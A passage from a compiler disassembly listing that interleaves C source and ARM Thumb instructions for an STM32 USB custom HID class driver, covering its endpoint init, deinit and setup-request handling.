 800844c:	e018      	b.n	8008480 <USB_ReadPMA+0x6a>
  {
    RdVal = *(__IO uint16_t *)pdwVal;
 800844e:	6a3b      	ldr	r3, [r7, #32]
 8008450:	881b      	ldrh	r3, [r3, #0]
 8008452:	b29b      	uxth	r3, r3
 8008454:	613b      	str	r3, [r7, #16]
    pdwVal++;
 8008456:	6a3b      	ldr	r3, [r7, #32]
 8008458:	3302      	adds	r3, #2
 800845a:	623b      	str	r3, [r7, #32]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 800845c:	693b      	ldr	r3, [r7, #16]
 800845e:	b2da      	uxtb	r2, r3
 8008460:	69fb      	ldr	r3, [r7, #28]
 8008462:	701a      	strb	r2, [r3, #0]
    pBuf++;
 8008464:	69fb      	ldr	r3, [r7, #28]
 8008466:	3301      	adds	r3, #1
 8008468:	61fb      	str	r3, [r7, #28]
    *pBuf = (uint8_t)((RdVal >> 8) & 0xFFU);
 800846a:	693b      	ldr	r3, [r7, #16]
 800846c:	0a1b      	lsrs	r3, r3, #8
 800846e:	b2da      	uxtb	r2, r3
 8008470:	69fb      	ldr	r3, [r7, #28]
 8008472:	701a      	strb	r2, [r3, #0]
    pBuf++;
 8008474:	69fb      	ldr	r3, [r7, #28]
 8008476:	3301      	adds	r3, #1
 8008478:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 800847a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800847c:	3b01      	subs	r3, #1
 800847e:	627b      	str	r3, [r7, #36]	; 0x24
 8008480:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008482:	2b00      	cmp	r3, #0
 8008484:	d1e3      	bne.n	800844e <USB_ReadPMA+0x38>
#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */
  }

  if ((wNBytes % 2U) != 0U)
 8008486:	88bb      	ldrh	r3, [r7, #4]
 8008488:	f003 0301 	and.w	r3, r3, #1
 800848c:	b29b      	uxth	r3, r3
 800848e:	2b00      	cmp	r3, #0
 8008490:	d007      	beq.n	80084a2 <USB_ReadPMA+0x8c>
  {
    RdVal = *pdwVal;
 8008492:	6a3b      	ldr	r3, [r7, #32]
 8008494:	881b      	ldrh	r3, [r3, #0]
 8008496:	b29b      	uxth	r3, r3
 8008498:	613b      	str	r3, [r7, #16]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 800849a:	693b      	ldr	r3, [r7, #16]
 800849c:	b2da      	uxtb	r2, r3
 800849e:	69fb      	ldr	r3, [r7, #28]
 80084a0:	701a      	strb	r2, [r3, #0]
  }
}
 80084a2:	bf00      	nop
 80084a4:	372c      	adds	r7, #44	; 0x2c
 80084a6:	46bd      	mov	sp, r7
 80084a8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80084ac:	4770      	bx	lr
	...

080084b0 <USBD_CUSTOM_HID_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 80084b0:	b580      	push	{r7, lr}
 80084b2:	b084      	sub	sp, #16
 80084b4:	af00      	add	r7, sp, #0
 80084b6:	6078      	str	r0, [r7, #4]
 80084b8:	460b      	mov	r3, r1
 80084ba:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)USBD_malloc(sizeof(USBD_CUSTOM_HID_HandleTypeDef));
 80084bc:	2024      	movs	r0, #36	; 0x24
 80084be:	f004 fd05 	bl	800cecc <USBD_static_malloc>
 80084c2:	60f8      	str	r0, [r7, #12]

  if (hhid == NULL)
 80084c4:	68fb      	ldr	r3, [r7, #12]
 80084c6:	2b00      	cmp	r3, #0
 80084c8:	d109      	bne.n	80084de <USBD_CUSTOM_HID_Init+0x2e>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 80084ca:	687b      	ldr	r3, [r7, #4]
 80084cc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80084d0:	687b      	ldr	r3, [r7, #4]
 80084d2:	32b0      	adds	r2, #176	; 0xb0
 80084d4:	2100      	movs	r1, #0
 80084d6:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 80084da:	2302      	movs	r3, #2
 80084dc:	e08b      	b.n	80085f6 <USBD_CUSTOM_HID_Init+0x146>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hhid;
 80084de:	687b      	ldr	r3, [r7, #4]
 80084e0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80084e4:	687b      	ldr	r3, [r7, #4]
 80084e6:	32b0      	adds	r2, #176	; 0xb0
 80084e8:	68f9      	ldr	r1, [r7, #12]
 80084ea:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 80084ee:	687b      	ldr	r3, [r7, #4]
 80084f0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80084f4:	687b      	ldr	r3, [r7, #4]
 80084f6:	32b0      	adds	r2, #176	; 0xb0
 80084f8:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 80084fc:	687b      	ldr	r3, [r7, #4]
 80084fe:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008502:	687b      	ldr	r3, [r7, #4]
 8008504:	7c1b      	ldrb	r3, [r3, #16]
 8008506:	2b00      	cmp	r3, #0
 8008508:	d11b      	bne.n	8008542 <USBD_CUSTOM_HID_Init+0x92>
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 800850a:	4b3d      	ldr	r3, [pc, #244]	; (8008600 <USBD_CUSTOM_HID_Init+0x150>)
 800850c:	781b      	ldrb	r3, [r3, #0]
 800850e:	f003 020f 	and.w	r2, r3, #15
 8008512:	6879      	ldr	r1, [r7, #4]
 8008514:	4613      	mov	r3, r2
 8008516:	009b      	lsls	r3, r3, #2
 8008518:	4413      	add	r3, r2
 800851a:	009b      	lsls	r3, r3, #2
 800851c:	440b      	add	r3, r1
 800851e:	3326      	adds	r3, #38	; 0x26
 8008520:	2205      	movs	r2, #5
 8008522:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008524:	4b37      	ldr	r3, [pc, #220]	; (8008604 <USBD_CUSTOM_HID_Init+0x154>)
 8008526:	781b      	ldrb	r3, [r3, #0]
 8008528:	f003 020f 	and.w	r2, r3, #15
 800852c:	6879      	ldr	r1, [r7, #4]
 800852e:	4613      	mov	r3, r2
 8008530:	009b      	lsls	r3, r3, #2
 8008532:	4413      	add	r3, r2
 8008534:	009b      	lsls	r3, r3, #2
 8008536:	440b      	add	r3, r1
 8008538:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 800853c:	2205      	movs	r2, #5
 800853e:	801a      	strh	r2, [r3, #0]
 8008540:	e01a      	b.n	8008578 <USBD_CUSTOM_HID_Init+0xc8>
  }
  else   /* LOW and FULL-speed endpoints */
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008542:	4b2f      	ldr	r3, [pc, #188]	; (8008600 <USBD_CUSTOM_HID_Init+0x150>)
 8008544:	781b      	ldrb	r3, [r3, #0]
 8008546:	f003 020f 	and.w	r2, r3, #15
 800854a:	6879      	ldr	r1, [r7, #4]
 800854c:	4613      	mov	r3, r2
 800854e:	009b      	lsls	r3, r3, #2
 8008550:	4413      	add	r3, r2
 8008552:	009b      	lsls	r3, r3, #2
 8008554:	440b      	add	r3, r1
 8008556:	3326      	adds	r3, #38	; 0x26
 8008558:	2205      	movs	r2, #5
 800855a:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 800855c:	4b29      	ldr	r3, [pc, #164]	; (8008604 <USBD_CUSTOM_HID_Init+0x154>)
 800855e:	781b      	ldrb	r3, [r3, #0]
 8008560:	f003 020f 	and.w	r2, r3, #15
 8008564:	6879      	ldr	r1, [r7, #4]
 8008566:	4613      	mov	r3, r2
 8008568:	009b      	lsls	r3, r3, #2
 800856a:	4413      	add	r3, r2
 800856c:	009b      	lsls	r3, r3, #2
 800856e:	440b      	add	r3, r1
 8008570:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 8008574:	2205      	movs	r2, #5
 8008576:	801a      	strh	r2, [r3, #0]
  }

  /* Open EP IN */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDInEpAdd, USBD_EP_TYPE_INTR,
 8008578:	4b21      	ldr	r3, [pc, #132]	; (8008600 <USBD_CUSTOM_HID_Init+0x150>)
 800857a:	7819      	ldrb	r1, [r3, #0]
 800857c:	2302      	movs	r3, #2
 800857e:	2203      	movs	r2, #3
 8008580:	6878      	ldr	r0, [r7, #4]
 8008582:	f004 fa6f 	bl	800ca64 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPIN_SIZE);

  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 1U;
 8008586:	4b1e      	ldr	r3, [pc, #120]	; (8008600 <USBD_CUSTOM_HID_Init+0x150>)
 8008588:	781b      	ldrb	r3, [r3, #0]
 800858a:	f003 020f 	and.w	r2, r3, #15
 800858e:	6879      	ldr	r1, [r7, #4]
 8008590:	4613      	mov	r3, r2
 8008592:	009b      	lsls	r3, r3, #2
 8008594:	4413      	add	r3, r2
 8008596:	009b      	lsls	r3, r3, #2
 8008598:	440b      	add	r3, r1
 800859a:	3324      	adds	r3, #36	; 0x24
 800859c:	2201      	movs	r2, #1
 800859e:	801a      	strh	r2, [r3, #0]

  /* Open EP OUT */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDOutEpAdd, USBD_EP_TYPE_INTR,
 80085a0:	4b18      	ldr	r3, [pc, #96]	; (8008604 <USBD_CUSTOM_HID_Init+0x154>)
 80085a2:	7819      	ldrb	r1, [r3, #0]
 80085a4:	2302      	movs	r3, #2
 80085a6:	2203      	movs	r2, #3
 80085a8:	6878      	ldr	r0, [r7, #4]
 80085aa:	f004 fa5b 	bl	800ca64 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPOUT_SIZE);

  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 1U;
 80085ae:	4b15      	ldr	r3, [pc, #84]	; (8008604 <USBD_CUSTOM_HID_Init+0x154>)
 80085b0:	781b      	ldrb	r3, [r3, #0]
 80085b2:	f003 020f 	and.w	r2, r3, #15
 80085b6:	6879      	ldr	r1, [r7, #4]
 80085b8:	4613      	mov	r3, r2
 80085ba:	009b      	lsls	r3, r3, #2
 80085bc:	4413      	add	r3, r2
 80085be:	009b      	lsls	r3, r3, #2
 80085c0:	440b      	add	r3, r1
 80085c2:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 80085c6:	2201      	movs	r2, #1
 80085c8:	801a      	strh	r2, [r3, #0]

  hhid->state = CUSTOM_HID_IDLE;
 80085ca:	68fb      	ldr	r3, [r7, #12]
 80085cc:	2200      	movs	r2, #0
 80085ce:	f883 2020 	strb.w	r2, [r3, #32]

  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->Init();
 80085d2:	687b      	ldr	r3, [r7, #4]
 80085d4:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80085d8:	687a      	ldr	r2, [r7, #4]
 80085da:	33b0      	adds	r3, #176	; 0xb0
 80085dc:	009b      	lsls	r3, r3, #2
 80085de:	4413      	add	r3, r2
 80085e0:	685b      	ldr	r3, [r3, #4]
 80085e2:	685b      	ldr	r3, [r3, #4]
 80085e4:	4798      	blx	r3

#ifndef USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED
  /* Prepare Out endpoint to receive 1st packet */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 80085e6:	4b07      	ldr	r3, [pc, #28]	; (8008604 <USBD_CUSTOM_HID_Init+0x154>)
 80085e8:	7819      	ldrb	r1, [r3, #0]
 80085ea:	68fa      	ldr	r2, [r7, #12]
 80085ec:	230f      	movs	r3, #15
 80085ee:	6878      	ldr	r0, [r7, #4]
 80085f0:	f004 fbea 	bl	800cdc8 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
#endif /* USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED */

  return (uint8_t)USBD_OK;
 80085f4:	2300      	movs	r3, #0
}
 80085f6:	4618      	mov	r0, r3
 80085f8:	3710      	adds	r7, #16
 80085fa:	46bd      	mov	sp, r7
 80085fc:	bd80      	pop	{r7, pc}
 80085fe:	bf00      	nop
 8008600:	200000a6 	.word	0x200000a6
 8008604:	200000a7 	.word	0x200000a7

08008608 <USBD_CUSTOM_HID_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008608:	b580      	push	{r7, lr}
 800860a:	b082      	sub	sp, #8
 800860c:	af00      	add	r7, sp, #0
 800860e:	6078      	str	r0, [r7, #4]
 8008610:	460b      	mov	r3, r1
 8008612:	70fb      	strb	r3, [r7, #3]
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close CUSTOM_HID EP IN */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDInEpAdd);
 8008614:	4b37      	ldr	r3, [pc, #220]	; (80086f4 <USBD_CUSTOM_HID_DeInit+0xec>)
 8008616:	781b      	ldrb	r3, [r3, #0]
 8008618:	4619      	mov	r1, r3
 800861a:	6878      	ldr	r0, [r7, #4]
 800861c:	f004 fa60 	bl	800cae0 <USBD_LL_CloseEP>
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 0U;
 8008620:	4b34      	ldr	r3, [pc, #208]	; (80086f4 <USBD_CUSTOM_HID_DeInit+0xec>)
 8008622:	781b      	ldrb	r3, [r3, #0]
 8008624:	f003 020f 	and.w	r2, r3, #15
 8008628:	6879      	ldr	r1, [r7, #4]
 800862a:	4613      	mov	r3, r2
 800862c:	009b      	lsls	r3, r3, #2
 800862e:	4413      	add	r3, r2
 8008630:	009b      	lsls	r3, r3, #2
 8008632:	440b      	add	r3, r1
 8008634:	3324      	adds	r3, #36	; 0x24
 8008636:	2200      	movs	r2, #0
 8008638:	801a      	strh	r2, [r3, #0]
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = 0U;
 800863a:	4b2e      	ldr	r3, [pc, #184]	; (80086f4 <USBD_CUSTOM_HID_DeInit+0xec>)
 800863c:	781b      	ldrb	r3, [r3, #0]
 800863e:	f003 020f 	and.w	r2, r3, #15
 8008642:	6879      	ldr	r1, [r7, #4]
 8008644:	4613      	mov	r3, r2
 8008646:	009b      	lsls	r3, r3, #2
 8008648:	4413      	add	r3, r2
 800864a:	009b      	lsls	r3, r3, #2
 800864c:	440b      	add	r3, r1
 800864e:	3326      	adds	r3, #38	; 0x26
 8008650:	2200      	movs	r2, #0
 8008652:	801a      	strh	r2, [r3, #0]

  /* Close CUSTOM_HID EP OUT */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDOutEpAdd);
 8008654:	4b28      	ldr	r3, [pc, #160]	; (80086f8 <USBD_CUSTOM_HID_DeInit+0xf0>)
 8008656:	781b      	ldrb	r3, [r3, #0]
 8008658:	4619      	mov	r1, r3
 800865a:	6878      	ldr	r0, [r7, #4]
 800865c:	f004 fa40 	bl	800cae0 <USBD_LL_CloseEP>
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 0U;
 8008660:	4b25      	ldr	r3, [pc, #148]	; (80086f8 <USBD_CUSTOM_HID_DeInit+0xf0>)
 8008662:	781b      	ldrb	r3, [r3, #0]
 8008664:	f003 020f 	and.w	r2, r3, #15
 8008668:	6879      	ldr	r1, [r7, #4]
 800866a:	4613      	mov	r3, r2
 800866c:	009b      	lsls	r3, r3, #2
 800866e:	4413      	add	r3, r2
 8008670:	009b      	lsls	r3, r3, #2
 8008672:	440b      	add	r3, r1
 8008674:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008678:	2200      	movs	r2, #0
 800867a:	801a      	strh	r2, [r3, #0]
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = 0U;
 800867c:	4b1e      	ldr	r3, [pc, #120]	; (80086f8 <USBD_CUSTOM_HID_DeInit+0xf0>)
 800867e:	781b      	ldrb	r3, [r3, #0]
 8008680:	f003 020f 	and.w	r2, r3, #15
 8008684:	6879      	ldr	r1, [r7, #4]
 8008686:	4613      	mov	r3, r2
 8008688:	009b      	lsls	r3, r3, #2
 800868a:	4413      	add	r3, r2
 800868c:	009b      	lsls	r3, r3, #2
 800868e:	440b      	add	r3, r1
 8008690:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 8008694:	2200      	movs	r2, #0
 8008696:	801a      	strh	r2, [r3, #0]

  /* Free allocated memory */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 8008698:	687b      	ldr	r3, [r7, #4]
 800869a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800869e:	687b      	ldr	r3, [r7, #4]
 80086a0:	32b0      	adds	r2, #176	; 0xb0
 80086a2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80086a6:	2b00      	cmp	r3, #0
 80086a8:	d01f      	beq.n	80086ea <USBD_CUSTOM_HID_DeInit+0xe2>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->DeInit();
 80086aa:	687b      	ldr	r3, [r7, #4]
 80086ac:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80086b0:	687a      	ldr	r2, [r7, #4]
 80086b2:	33b0      	adds	r3, #176	; 0xb0
 80086b4:	009b      	lsls	r3, r3, #2
 80086b6:	4413      	add	r3, r2
 80086b8:	685b      	ldr	r3, [r3, #4]
 80086ba:	689b      	ldr	r3, [r3, #8]
 80086bc:	4798      	blx	r3
    USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 80086be:	687b      	ldr	r3, [r7, #4]
 80086c0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80086c4:	687b      	ldr	r3, [r7, #4]
 80086c6:	32b0      	adds	r2, #176	; 0xb0
 80086c8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80086cc:	4618      	mov	r0, r3
 80086ce:	f004 fc19 	bl	800cf04 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 80086d2:	687b      	ldr	r3, [r7, #4]
 80086d4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80086d8:	687b      	ldr	r3, [r7, #4]
 80086da:	32b0      	adds	r2, #176	; 0xb0
 80086dc:	2100      	movs	r1, #0
 80086de:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 80086e2:	687b      	ldr	r3, [r7, #4]
 80086e4:	2200      	movs	r2, #0
 80086e6:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 80086ea:	2300      	movs	r3, #0
}
 80086ec:	4618      	mov	r0, r3
 80086ee:	3708      	adds	r7, #8
 80086f0:	46bd      	mov	sp, r7
 80086f2:	bd80      	pop	{r7, pc}
 80086f4:	200000a6 	.word	0x200000a6
 80086f8:	200000a7 	.word	0x200000a7

080086fc <USBD_CUSTOM_HID_Setup>:
  * @param  req: usb requests
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Setup(USBD_HandleTypeDef *pdev,
                                     USBD_SetupReqTypedef *req)
{
 80086fc:	b580      	push	{r7, lr}
 80086fe:	b088      	sub	sp, #32
 8008700:	af00      	add	r7, sp, #0
 8008702:	6078      	str	r0, [r7, #4]
 8008704:	6039      	str	r1, [r7, #0]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008706:	687b      	ldr	r3, [r7, #4]
 8008708:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800870c:	687b      	ldr	r3, [r7, #4]
 800870e:	32b0      	adds	r2, #176	; 0xb0
 8008710:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008714:	613b      	str	r3, [r7, #16]
  uint16_t len = 0U;
 8008716:	2300      	movs	r3, #0
 8008718:	83fb      	strh	r3, [r7, #30]
#ifdef USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED
  uint16_t ReportLength = 0U;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */
  uint8_t  *pbuf = NULL;
 800871a:	2300      	movs	r3, #0
 800871c:	61bb      	str	r3, [r7, #24]
  uint16_t status_info = 0U;
 800871e:	2300      	movs	r3, #0
 8008720:	81fb      	strh	r3, [r7, #14]
  USBD_StatusTypeDef ret = USBD_OK;
 8008722:	2300      	movs	r3, #0
 8008724:	75fb      	strb	r3, [r7, #23]

  if (hhid == NULL)
 8008726:	693b      	ldr	r3, [r7, #16]
 8008728:	2b00      	cmp	r3, #0
 800872a:	d101      	bne.n	8008730 <USBD_CUSTOM_HID_Setup+0x34>
  {
    return (uint8_t)USBD_FAIL;
 800872c:	2303      	movs	r3, #3
 800872e:	e0f8      	b.n	8008922 <USBD_CUSTOM_HID_Setup+0x226>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 8008730:	683b      	ldr	r3, [r7, #0]
 8008732:	781b      	ldrb	r3, [r3, #0]
 8008734:	f003 0360 	and.w	r3, r3, #96	; 0x60
 8008738:	2b00      	cmp	r3, #0
 800873a:	d056      	beq.n	80087ea <USBD_CUSTOM_HID_Setup+0xee>
 800873c:	2b20      	cmp	r3, #32
 800873e:	f040 80e8 	bne.w	8008912 <USBD_CUSTOM_HID_Setup+0x216>
  {
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 8008742:	683b      	ldr	r3, [r7, #0]
 8008744:	785b      	ldrb	r3, [r3, #1]
 8008746:	3b02      	subs	r3, #2
 8008748:	2b09      	cmp	r3, #9
 800874a:	d846      	bhi.n	80087da <USBD_CUSTOM_HID_Setup+0xde>
 800874c:	a201      	add	r2, pc, #4	; (adr r2, 8008754 <USBD_CUSTOM_HID_Setup+0x58>)
 800874e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8008752:	bf00      	nop
 8008754:	080087ad 	.word	0x080087ad
 8008758:	0800878b 	.word	0x0800878b
 800875c:	080087db 	.word	0x080087db
 8008760:	080087db 	.word	0x080087db
 8008764:	080087db 	.word	0x080087db
 8008768:	080087db 	.word	0x080087db
 800876c:	080087db 	.word	0x080087db
 8008770:	080087bd 	.word	0x080087bd
 8008774:	0800879b 	.word	0x0800879b
 8008778:	0800877d 	.word	0x0800877d
      {
        case CUSTOM_HID_REQ_SET_PROTOCOL:
          hhid->Protocol = (uint8_t)(req->wValue);
 800877c:	683b      	ldr	r3, [r7, #0]
 800877e:	885b      	ldrh	r3, [r3, #2]
 8008780:	b2db      	uxtb	r3, r3
 8008782:	461a      	mov	r2, r3
 8008784:	693b      	ldr	r3, [r7, #16]
 8008786:	611a      	str	r2, [r3, #16]
          break;
 8008788:	e02e      	b.n	80087e8 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_PROTOCOL:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->Protocol, 1U);
 800878a:	693b      	ldr	r3, [r7, #16]
 800878c:	3310      	adds	r3, #16
 800878e:	2201      	movs	r2, #1
 8008790:	4619      	mov	r1, r3
 8008792:	6878      	ldr	r0, [r7, #4]
 8008794:	f003 fd0e 	bl	800c1b4 <USBD_CtlSendData>
          break;
 8008798:	e026      	b.n	80087e8 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_SET_IDLE:
          hhid->IdleState = (uint8_t)(req->wValue >> 8);
 800879a:	683b      	ldr	r3, [r7, #0]
 800879c:	885b      	ldrh	r3, [r3, #2]
 800879e:	0a1b      	lsrs	r3, r3, #8
 80087a0:	b29b      	uxth	r3, r3
 80087a2:	b2db      	uxtb	r3, r3
 80087a4:	461a      	mov	r2, r3
 80087a6:	693b      	ldr	r3, [r7, #16]
 80087a8:	615a      	str	r2, [r3, #20]
          break;
 80087aa:	e01d      	b.n	80087e8 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_IDLE:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->IdleState, 1U);
 80087ac:	693b      	ldr	r3, [r7, #16]
 80087ae:	3314      	adds	r3, #20
 80087b0:	2201      	movs	r2, #1
 80087b2:	4619      	mov	r1, r3
 80087b4:	6878      	ldr	r0, [r7, #4]
 80087b6:	f003 fcfd 	bl	800c1b4 <USBD_CtlSendData>
          break;
 80087ba:	e015      	b.n	80087e8 <USBD_CUSTOM_HID_Setup+0xec>
            ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->CtrlReqComplete(req->bRequest,
                                                                                            req->wLength);
          }
#endif /* USBD_CUSTOMHID_CTRL_REQ_COMPLETE_CALLBACK_ENABLED */
#ifndef USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED
          hhid->IsReportAvailable = 1U;
 80087bc:	693b      	ldr	r3, [r7, #16]
 80087be:	2201      	movs	r2, #1
 80087c0:	61da      	str	r2, [r3, #28]
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 80087c2:	6939      	ldr	r1, [r7, #16]
                                  MIN(req->wLength, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE));
 80087c4:	683b      	ldr	r3, [r7, #0]
 80087c6:	88db      	ldrh	r3, [r3, #6]
 80087c8:	2b0f      	cmp	r3, #15
 80087ca:	bf28      	it	cs
 80087cc:	230f      	movcs	r3, #15
 80087ce:	b29b      	uxth	r3, r3
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 80087d0:	461a      	mov	r2, r3
 80087d2:	6878      	ldr	r0, [r7, #4]
 80087d4:	f003 fd1a 	bl	800c20c <USBD_CtlPrepareRx>
#endif /* USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED */
          break;
 80087d8:	e006      	b.n	80087e8 <USBD_CUSTOM_HID_Setup+0xec>
          }
          break;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */

        default:
          USBD_CtlError(pdev, req);
 80087da:	6839      	ldr	r1, [r7, #0]
 80087dc:	6878      	ldr	r0, [r7, #4]
 80087de:	f003 fc78 	bl	800c0d2 <USBD_CtlError>
          ret = USBD_FAIL;
 80087e2:	2303      	movs	r3, #3
 80087e4:	75fb      	strb	r3, [r7, #23]
          break;
 80087e6:	bf00      	nop
      }
      break;
 80087e8:	e09a      	b.n	8008920 <USBD_CUSTOM_HID_Setup+0x224>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 80087ea:	683b      	ldr	r3, [r7, #0]
 80087ec:	785b      	ldrb	r3, [r3, #1]
 80087ee:	2b0b      	cmp	r3, #11
 80087f0:	f200 8086 	bhi.w	8008900 <USBD_CUSTOM_HID_Setup+0x204>
 80087f4:	a201      	add	r2, pc, #4	; (adr r2, 80087fc <USBD_CUSTOM_HID_Setup+0x100>)
 80087f6:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80087fa:	bf00      	nop
 80087fc:	0800882d 	.word	0x0800882d
 8008800:	0800890f 	.word	0x0800890f
 8008804:	08008901 	.word	0x08008901
 8008808:	08008901 	.word	0x08008901
 800880c:	08008901 	.word	0x08008901
 8008810:	08008901 	.word	0x08008901
 8008814:	08008857 	.word	0x08008857
 8008818:	08008901 	.word	0x08008901
 800881c:	08008901 	.word	0x08008901
 8008820:	08008901 	.word	0x08008901
 8008824:	080088af 	.word	0x080088af
 8008828:	080088d9 	.word	0x080088d9
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800882c:	687b      	ldr	r3, [r7, #4]
 800882e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008832:	b2db      	uxtb	r3, r3
 8008834:	2b03      	cmp	r3, #3
 8008836:	d107      	bne.n	8008848 <USBD_CUSTOM_HID_Setup+0x14c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 8008838:	f107 030e 	add.w	r3, r7, #14
 800883c:	2202      	movs	r2, #2
